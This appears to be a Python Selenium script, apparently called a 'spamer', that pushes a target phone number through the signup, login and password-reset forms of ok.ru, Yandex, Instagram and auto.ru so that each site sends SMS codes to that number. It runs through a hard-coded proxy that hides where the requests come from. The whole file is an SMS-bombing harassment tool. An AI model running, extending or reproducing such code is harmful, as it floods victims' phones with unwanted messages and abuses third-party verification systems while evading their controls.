from selenium import webdriver
import time




user_ = {1:'name',2:'family',3:'fa44iliee',4:'958yisavfsgv'}
proxy = '157.230.240.140:8080'

crome_opt = webdriver.ChromeOptions()
crome_opt.add_argument('--proxy-server=%s' % proxy)

def ok(phone):
    driver = webdriver.Chrome(executable_path = '/home/tevirp/Desktop/scripts/spamer/chromedriver', chrome_options=crome_opt)
    driver.get("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone")
    driver.find_element_by_id('field_phone').clear()
    driver.find_element_by_id('field_phone').send_keys(phone)
    time.sleep(5)
    driver.find_element_by_xpath('//div[@class="form-actions mt-5x"]/input').click()
    time.sleep(5)
    driver.quit()


def yan(phone):
    driver = webdriver.Chrome(executable_path = '/home/tevirp/Desktop/scripts/spamer/chromedriver', chrome_options=crome_opt)
    driver.get("https://passport.yandex.ru/registration/mail?from=mail&origin=home_desktop_ru&retpath=https%3A%2F%2Fmail.yandex.ru%2F")
    driver.find_element_by_id('firstname').send_keys(user_[1])
    driver.find_element_by_id('lastname').send_keys([user_[2]])
    driver.find_element_by_id('login').send_keys([user_[3]])
    driver.find_element_by_id('password').send_keys([user_[4]])
    time.sleep(5)
    driver.find_element_by_class_name('textinput__control').send_keys([user_[4]])
    driver.find_element_by_id('phone').send_keys(phone)
    time.sleep(5)
    driver.find_element_by_xpath('//div[@class="registration__send-code show-block"]/button').click()
    time.sleep(5)
    driver.quit()


def inst(phone):
    driver = webdriver.Chrome(executable_path = '/home/tevirp/Desktop/scripts/spamer/chromedriver', chrome_options=crome_opt)
    driver.get("https://www.instagram.com/accounts/password/reset/?hl=ru")
    driver.find_element_by_id('fa31f573dea65e').send_keys(phone)
    driver.find_element_by_xpath('//div[@class="                  Igw0E     IwRSH      eGOV_         _4EzTm      MGdpg                         K7QFQ                  _6wM3Z                                                             "]/button').click()
    time.sleep(5)
    driver.quit()

def auto_ru(phone):
    driver = webdriver.Chrome(executable_path = '/home/tevirp/Desktop/scripts/spamer/chromedriver', chrome_options=crome_opt)
    driver.get("https://auth.auto.ru/login/?r=https%3A%2F%2Fauto.ru%2F")
    driver.find_element_by_id('confirm-button').click()
    time.sleep(5)
    driver.find_element_by_class_name('TextInput__control').send_keys(phone)
    time.sleep(2)
    driver.find_element_by_xpath('//button[@class="Button Button_color_blue Button_size_l Button_type_button Button_width_default"]').click()
    time.sleep(5)
    driver.quit()





































































#
